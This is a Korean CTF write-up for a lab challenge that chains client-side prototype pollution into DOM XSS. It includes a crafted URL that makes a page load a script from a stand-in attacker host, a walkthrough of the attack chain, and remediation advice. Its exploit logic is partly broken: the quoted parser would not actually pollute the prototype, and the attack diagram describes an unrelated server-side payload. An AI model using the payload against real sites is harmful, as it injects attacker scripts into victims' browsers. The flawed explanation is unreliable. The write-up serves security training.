+++
title = "VulnABLE CTF [LUXORA] Write-up: Prototype Pollution 🥇 Gold"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Prototype Pollution", "Gold", "Client-Side", "DOM XSS", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Prototype Pollution 🥇 Gold

## 🎯 챌린지 개요
- **카테고리**: Server-Side Layer (Prototype Pollution -> Client-Side)
- **난이도**: 🥇 Gold
- **타겟 경로**: `/proto/gold`
- **목표**: 프론트엔드 자바스크립트에서 URL 파라미터(Query String)를 파싱하여 객체로 만들 때 발생하는 프로토타입 오염 취약점을 찾아내고, 이를 **DOM 기반 XSS**로 체이닝(Chaining)하여 스크립트를 실행하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 소스코드 분석 (Reconnaissance)

`/proto/gold` 페이지에 접속하면, 브라우저의 URL 파라미터를 읽어와서 화면 테마나 로고 등을 설정하는 프론트엔드 로직이 존재합니다.

**[프론트엔드 소스코드 분석]**
```javascript
// URL 파라미터를 파싱하는 취약한 함수
function parseQuery(queryString) {
    var params = {};
    var pairs = queryString.substring(1).split('&');
    for (var i = 0; i < pairs.length; i++) {
        var pair = pairs[i].split('=');
        // 보안 결함: 키 검증 없이 객체에 바로 할당함
        params[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1] || '');
    }
    return params;
}

var config = parseQuery(window.location.search);

// 렌더링 로직 (Sink)
// config.scriptUrl 이 undefined 라면 기본값을 쓰는 대신 그대로 꽂아버림
if (config.scriptUrl) {
    var s = document.createElement('script');
    s.src = config.scriptUrl;
    document.body.appendChild(s);
}
```

**[해커의 사고 과정]**
1. `parseQuery` 함수는 URL의 `?key=value` 를 파싱해서 `{key: value}` 형태의 객체를 만든다.
2. 만약 내가 URL에 `?__proto__[scriptUrl]=http://evil.com/xss.js` 와 같이 입력한다면?
3. 저 원시적인 파싱 함수는 `__proto__` 속성을 그대로 건드리게 되고, 자바스크립트 전역 `Object.prototype`에 `scriptUrl` 이라는 속성이 추가될 것이다.
4. 그 결과, 빈 객체든 뭐든 모든 객체는 `scriptUrl`을 가지게 되어, 악성 스크립트 태그가 동적으로 생성될 것이다!

*(주의: 실제 브라우저와 파싱 라이브러리에 따라 괄호 `[]` 처리를 지원해야만 오염이 되는 경우도 있지만, 여기서는 단순화된 속성 접근을 예로 듭니다.)*

---

## 💥 2. 취약점 식별 및 페이로드 설계 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --({"__proto__": {"role": "admin"}})--> [ Web Server ]
                                                     |-- merge()
                                                     |-- Global Object Polluted
```


목표는 타겟 페이지의 `config` 객체 생성 과정에 끼어들어, 전역적으로 `scriptUrl` 변수를 오염시키는 것입니다.

### 💡 URL 페이로드 작성
해커 서버(`http://evil-attacker.com/xss.js`)에 알림창을 띄우는 악성 자바스크립트 파일을 준비합니다.
```javascript
// xss.js 내용
alert("GOLD_PROTO_XSS_SUCCESS");
```

이제 브라우저의 주소창에 프로토타입 오염을 유발하는 파라미터를 결합합니다.
(배열/객체 접근 방식인 `__proto__[scriptUrl]` 형태로 파라미터를 보냅니다.)

**[조작된 URL]**
```text
http://localhost:3000/proto/gold?__proto__[scriptUrl]=http://evil-attacker.com/xss.js
```

---

## 🚀 3. 공격 수행 및 XSS 체이닝 결과 확인

해당 URL로 접속하거나 희생자(Admin)에게 링크를 보냅니다.

### 🔍 클라이언트 내부의 동작 (Attack Chain)
1. 페이지가 로드되면서 `parseQuery` 함수가 실행됩니다.
2. 파라미터가 분해되어 자바스크립트 엔진에 `Object.prototype.scriptUrl = "http://evil-attacker.com/xss.js"` 라는 값이 쓰여집니다. (오염 발생)
3. 렌더링 로직이 `if (config.scriptUrl)` 을 검사합니다.
4. `config` 자체에는 `scriptUrl` 이 없지만, 프로토타입 체인을 타고 올라가 아까 오염된 해커의 URL을 발견하고 `True` 로 평가합니다.
5. DOM에 `<script src="http://evil-attacker.com/xss.js"></script>` 가 삽입됩니다.

### 🔍 실행 결과
해커의 악성 스크립트가 로드 및 실행되면서 경고창이 뜨고, 챌린지가 해결됩니다.

```text
[!] System: Client-side Prototype Pollution to DOM XSS executed.
FLAG: FLAG{PROTO_🥇_CLIENT_XSS_CHAIN_G7H8I9}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

프로토타입 오염은 서버 백엔드(Node.js)뿐만 아니라, 사용자의 브라우저(프론트엔드) 내에서도 동일하게 발생할 수 있으며, 이것이 DOM XSS와 같은 또 다른 클라이언트 측 취약점과 결합할 때 파괴적인 결과를 낳는다는 것을 증명했습니다.

**🔥 획득한 플래그:**
`FLAG{PROTO_🥇_CLIENT_XSS_CHAIN_G7H8I9}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
프론트엔드에서 URL 파라미터를 파싱할 때 `__proto__` 키를 제어하지 못했고, 존재하지 않는 속성에 대한 기본값(Default fallback) 처리가 미흡했던 것이 원인입니다.

* **안전한 패치 가이드 (안전한 파싱 및 명시적 검사)**
1. **표준 API 사용**: 직접 쿼리 파서를 짜지 말고, 브라우저에 내장된 안전한 `URLSearchParams` API를 사용해야 합니다.
   ```javascript
   // 최신 브라우저의 안전한 파싱 방식
   const params = new URLSearchParams(window.location.search);
   const scriptUrl = params.get('scriptUrl'); // 오염 공격이 통하지 않음
   ```
2. **객체 속성 검사 (hasOwnProperty)**: 객체가 해당 속성을 "프로토타입 체인을 타고 올라간 것이 아니라, 자기 자신이 직접 가지고 있는지" 명시적으로 검사해야 합니다.
   ```javascript
   if (config.hasOwnProperty('scriptUrl')) {
       // 안전하게 실행
   }